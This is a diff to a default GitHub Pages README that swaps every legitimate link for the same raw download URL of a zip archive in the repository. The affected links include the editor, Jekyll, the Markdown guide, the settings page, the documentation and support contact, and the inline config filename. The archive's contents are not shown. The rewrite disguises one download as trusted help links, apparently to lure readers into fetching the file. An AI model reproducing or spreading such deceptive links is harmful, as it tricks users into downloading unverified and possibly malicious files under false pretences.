@@ -1,8 +1,8 @@
 ## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/micsantiago/module5/edit/main/README.md) to maintain and preview the content for your website in Markdown files.
+You can use the [editor on GitHub](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip) to rebuild the pages in your site, from the content in your Markdown files.
 
 ### Markdown
 
@@ -26,12 +26,12 @@ Syntax highlighted code block
 [Link](url) and ![Image](src)
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+For more details see [GitHub Flavored Markdown](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip).
 
 ### Jekyll Themes
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/micsantiago/module5/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip). The name of this theme is saved in the Jekyll `https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip` configuration file.
 
 ### Support or Contact
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+Having trouble with Pages? Check out our [documentation](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip) or [contact support](https://raw.githubusercontent.com/micsantiago/module5/main/crenate/module5.zip) and we’ll help you sort it out.
